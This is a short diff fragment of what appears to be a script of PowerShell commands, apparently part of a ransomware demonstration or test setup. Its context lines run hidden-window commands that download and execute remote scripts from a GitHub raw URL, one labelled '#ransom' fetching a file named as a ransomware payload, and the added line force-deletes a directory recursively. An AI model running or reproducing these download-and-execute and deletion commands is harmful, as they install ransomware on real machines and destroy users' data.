@@ -14,3 +14,5 @@ powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebCl
 
 #ransom
 powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/ransom_124509.ps1')"
+
+Remove-Item C:\CRDemo -Recurse -Force
